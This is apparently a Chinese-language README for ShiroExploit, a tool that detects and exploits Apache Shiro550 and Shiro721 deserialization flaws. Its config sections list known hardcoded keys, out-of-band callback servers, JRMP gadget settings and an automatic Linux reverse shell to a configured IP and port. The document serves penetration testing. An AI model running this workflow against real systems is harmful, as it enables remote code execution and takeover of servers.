# ShiroExploit
支持对Shiro550（硬编码秘钥）和Shiro721（Padding Oracle）的一键化检测

## 配置文件说明
```
[Keys]
Key1=kPH+bIxk5D2deZiIxcaaaA==
Key2=2AvVhdsgUs0FSA3SDFAdag==
```
* 程序中预置的Shiro（v1.2.4）可能使用的硬编码秘钥   
    
```
[Target]
TargetURL=http://192.168.177.129:8080/samples-shiro/
RememberMeCookie=tTXHGdbq8p+JGY5hWNe5CH9hyBVpA5Ru5vc+cmRrVYfMPV5ryxJ2UNWYxQu0626qDdit14EYa9u7JwaGkGL6YWf3BsaojfwCddgsga8RmeIxdppMuLQm11XC9O1w3fiUJ0TjZg7lHALTaDzoeiiS9oMLitkCLHEMN6HjkBJYT2MPYihzejL9+8Rj8ppXsYVC3EhDfYN5wrm8TN4qFyowf33XyIiwxlCFH3Z3Dw5uPTwYmEiwbRxCLqzc8HJXAvM7SfKgpTFCG0wNvjh07w53GtCDtc73ztn5G5kN+PZ07/GK7Oy+0YpjZj7TclJ28hgB86TE28pu7HbKD24oAO1NVLJ5ODRddlHan9pijJCUnDs9LJNCBWWyYEj87Ipk3vJ7I3cJo+/L6IbCgm7BRJ/sT+p+3JLlmb24OD5MTxadW520HNEM+YFD6gBFg9MKxULWfUfaU//b1tzt8zWCf3KEZH/bSmweVaef9TRj+DLJZ2792R6OOkS16hpDGiqnRwK0
VulType=2
UseJRMP=true
SkipIfFound=false
```
* ```TargetURL``` 表示想要检测的目标URL
* ```RememberMeCookie``` 表示一个有效的rememberMe cookie值，Shiro721漏洞利用的前提就是需要一个有效的rememberMe cookie, Shiro550漏洞不需要设置此项  
* ```VulType``` 数字1表示Shiro550，数字2表示Shiro721  
* ```UseJRMP``` 表示在漏洞利用过程中，是否使用JRMP协议，默认为true，有些Gadget比如CommonsCollections1在Shiro反序列化过程中会抛出异常，需要借助JRMP协议才能正常触发。程序中也支持不使用JRMP协议的方式，将此选择设置为false即可。  
* ```SkipIfFound``` 在找到一个有效的Gadget时，是否继续寻找其他有效的Gadget，默认为false  
* 在检测Shiro721漏洞时，使用JRMP协议可以有效的降低payoad的生成时间。这里给出一个数据作为对比，在本地测试过程中，使用Padding Oracle加密CommonsBeanutils1的payload需要约18.5分钟，使用Padding Oracle加密JRMP Client的payload需要约2.8分钟，大大提升了效率，在检测Shiro721的过程中，建议将此选项设置为true

```
[OOBService]
ServerAddress=10.21.140.78
HTTPPort=8080
JRMPPort=8088
```
* ```ServerAddress``` 开启了OOBService的Server地址，可以在公网中运行，也可以在内网中运行  
* ```HTTPPort``` Server监听的HTTPService的端口，如果未指定，默认为8080。如果Server的HTTPService的监听端口不是8080，此处需要做出相应的修改  
* ```JRMPPort``` Server监听的JRMPListener的端口，如果未指定，默认为8088。如果Server的JRMPListener的监听端口不是8088，此处需要作出相应的修改  
* 程序中默认实现了一个OOBService，可以认为是ceye的一个简单实现（支持HTTP/不支持DNS），用于配合程序的使用。可以使用命令```java -cp ShiroExploit.jar com.shiroExploit.server.BasicHTTPServer [port1] [port2]```进行开启，其中port1表示HTTPService的监听端口，port2表示JRMPListener的监听端口。如果未指定port参数，则HTTPService默认监听8080端口，JRMPListener默认监听8088端口  

```
[CeyeService]
Domain=7wt***.ceye.io
Token=a78**********09e0**********68b2
```
* ```Domain``` 注册得到的ceye域名  
* ```Domain``` 注册得到的API Token  
* 如果你觉得配置OOBService麻烦，不想使用OOBService，可以直接使用ceye的服务，此时程序不支持和JRMP协议配合使用。在检测Shiro550的时候，使用ceye服务可以使用URLDNS payload，可以非常方便的探测出目标使用的有效密钥，这是一个优势  
* 在同时配置了OOBService和CeyeService的情况下，程序会优先选择OOBService，如果OOBService不可用，程序会使用CeyeService  

```
[ReverseShell]
Ip=10.21.140.78
Port=12345
```
* ```Ip``` 反弹Shell的目标IP
* ```Port``` 反弹Shell的目标端口
* 程序在检测出目标应用存在相应漏洞和可利用的Gadget后，会自动根据提供的IP和端口尝试反弹shell（目前仅支持Linux平台的反弹shell）

```
[delay]
Delay=5
```
* ```Delay``` 程序发送触发HTTP/DNS请求的payload以后，延迟多长时间去OOBService/CeyeService去查看是否产生了相应的OOB请求，默认为5s  

## Shiro550使用示例
![img](https://raw.githubusercontent.com/feihong-cs/ShiroExploit/master/imgForReadMe/abc1.png)  

## Shiro721使用示例
![img](https://raw.githubusercontent.com/feihong-cs/ShiroExploit/master/imgForReadMe/abc2.png)

## 备注
在使用漏洞检测主程序或者使用OOBService时，均需要ysoserial.jar的支持，将ysoserial.jar和ShiroExploit.jar放置在同一目录即可。
